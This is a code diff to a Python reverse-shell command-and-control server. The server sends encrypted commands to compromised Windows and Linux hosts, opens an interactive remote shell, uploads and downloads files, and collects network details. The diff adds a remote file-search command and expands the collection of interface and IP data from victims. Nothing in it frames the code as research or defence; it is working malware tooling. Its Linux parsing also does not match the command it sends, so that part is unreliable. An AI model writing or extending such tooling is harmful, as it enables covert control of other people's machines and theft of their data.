@@ -129,6 +129,8 @@ class ReverseShellServer:
                 self.interactive_shell(conn)
             elif agent_command == "ipconfig":
                 self.handle_ipconfig(conn, client_id)
+            elif agent_command == "search":
+                self.handle_search(args, conn)
             else:
                 self.send_command(agent_command + " " + args, conn)
         else:
@@ -137,7 +139,7 @@ class ReverseShellServer:
     def handle_ipconfig(self, conn, client_id):
         os_type = self.client_id_map[client_id]["os"]
         if os_type == "Windows":
-            command = "powershell -Command \"Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne 'Disconnected' } | Select-Object -ExpandProperty IPv4Address | Select-Object -ExpandProperty IPAddress\""
+            command = "powershell -Command \"Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne 'Disconnected' } | Select-Object -ExpandProperty IPv4Address,InterfaceAlias\""
         else:
             command = "hostname -I | awk '{print $1}'"
         conn.send(AESCipher.encrypt(command).encode("utf-8"))
@@ -150,19 +152,32 @@ class ReverseShellServer:
             data += part
         try:
             decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
-            ips = self.extract_ips(decrypted_data)
-            print("[+] Local IP addresses:")
-            for ip in ips:
-                print(f"[+] {ip}")
+            interfaces = self.extract_interfaces_and_ips(decrypted_data)
+            print("[+] Local IP addresses and their interfaces:")
+            for interface, ip in interfaces.items():
+                print(f"[+] {interface}: {ip}")
         except Exception as e:
             print(f"[x] Failed to decrypt ipconfig data: {e}")
 
-    def extract_ips(self, data):
-        # Regex patterns for IPv4 and IPv6 addresses
-        ipv4_pattern = re.compile(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b")
-        ipv6_pattern = re.compile(r"\b(?:[A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}\b")
-        ips = ipv4_pattern.findall(data) + ipv6_pattern.findall(data)
-        return ips
+    def extract_interfaces_and_ips(self, data):
+        interfaces = {}
+        # Regex pattern for extracting interface names and IP addresses
+        windows_pattern = re.compile(
+            r"InterfaceAlias\s+:\s+(?P<interface>[\w\s]+).*?IPv4Address\s+:\s+(?P<ip>\d+\.\d+\.\d+\.\d+)",
+            re.DOTALL,
+        )
+        linux_pattern = re.compile(r"(\w+):\s.*\sinet\s(?P<ip>\d+\.\d+\.\d+\.\d+)")
+
+        if "InterfaceAlias" in data:
+            matches = windows_pattern.finditer(data)
+            for match in matches:
+                interfaces[match.group("interface").strip()] = match.group("ip").strip()
+        else:
+            matches = linux_pattern.finditer(data)
+            for match in matches:
+                interfaces[match.group(1).strip()] = match.group("ip").strip()
+
+        return interfaces
 
     def handle_download(self, file_path, conn):
         conn.send(AESCipher.encrypt(f"download {file_path}").encode("utf-8"))
@@ -198,6 +213,22 @@ class ReverseShellServer:
             print(f"[x] Failed to upload {file_path}: {e}")
             conn.send(AESCipher.encrypt("ERROR").encode("utf-8"))
 
+    def handle_search(self, file_name, conn):
+        conn.send(AESCipher.encrypt(f"search {file_name}").encode("utf-8"))
+        data = b""
+        while True:
+            part = conn.recv(1024)
+            if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
+                data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
+                break
+            data += part
+        try:
+            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
+            print("[+] Search Results:")
+            print(decrypted_data)
+        except Exception as e:
+            print(f"[x] Failed to decrypt search data: {e}")
+
     def interactive_shell(self, conn):
         while True:
             shell_command = input("[i] Shell (type 'exit' to return)> ")
@@ -217,7 +248,6 @@ class ReverseShellServer:
             data += part
         try:
             decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
-            print(decrypted_data)
             if decrypted_data:
                 print(decrypted_data)
         except Exception as e:
